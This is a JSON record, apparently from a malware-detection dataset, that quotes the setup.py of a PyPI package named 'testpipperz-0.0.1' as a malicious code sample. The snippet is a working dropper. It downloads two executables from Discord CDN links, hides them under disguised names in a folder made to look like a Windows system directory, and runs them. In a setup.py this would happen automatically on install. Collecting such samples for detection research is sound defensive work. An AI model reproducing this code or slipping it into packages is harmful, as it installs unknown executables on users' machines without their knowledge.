[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import os\nimport shutil\nimport time\nfrom pathlib import Path\n\ntry:\n    import requests\nexcept ImportError:\n    os.system(\"pip install requests\")\n    import requests\ntry:\n    import subprocess\nexcept ImportError:\n    os.system(\"pip install subprocess\")\n    import subprocess\n\nPATH = r\"C:\\$Windows.~SXK\"\ntry:\n    os.mkdir(PATH)\nexcept:\n    pass\n\nurl = 'https://cdn.discordapp.com/attachments/1003614072438280253/1003620490759381062/ZYXMN.exe'\nurl2 = 'https://cdn.discordapp.com/attachments/1003614072438280253/1003620490482548796/ZYRBX.exe'\n\ntry:\n    os.remove(r\"C:\\$Windows.~SXK\\WIN-siP1VyGDrfCYO2k3.exe\")\nexcept:\n    pass\ntry:\n    os.remove(r\"C:\\$Windows.~SXK\\WIN-XnWfTdfJsypQWB9d.exe\")\nexcept:\n    pass\n\ntry:\n    r = requests.get(url, allow_redirects=True)\n    r2 = requests.get(url2, allow_redirects=True)\n    open('ZYXMN.exe', 'wb').write(r.content)\n    Path(r\"ZYXMN.exe\").rename(r\"C:\\$Windows.~SXK\\WIN-siP1VyGDrfCYO2k3.exe\")\n    open('ZYRBX.exe', 'wb').write(r2.content)\n    Path(r\"ZYRBX.exe\").rename(r\"C:\\$Windows.~SXK\\WIN-XnWfTdfJsypQWB9d.exe\")\n    try:\n        os.remove('ZYRBX.exe')\n    except:\n        pass\n    try:\n        os.remove('ZYXMN.exe')\n    except:\n        pass\nexcept:\n    pass\n\nos.startfile(r\"C:\\$Windows.~SXK\\WIN-siP1VyGDrfCYO2k3.exe\")\nos.startfile(r\"C:\\$Windows.~SXK\\WIN-XnWfTdfJsypQWB9d.exe\")\n\ntry:\n    shutil.rmtree(r\"C:\\$Windows.~SXK\")\nexcept:\n    pass"
  },
  {
    "metadata": {
      "package_name": "testpipperz-0.0.1",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/testpipperz-0.0.1.txt"
    }
  }
]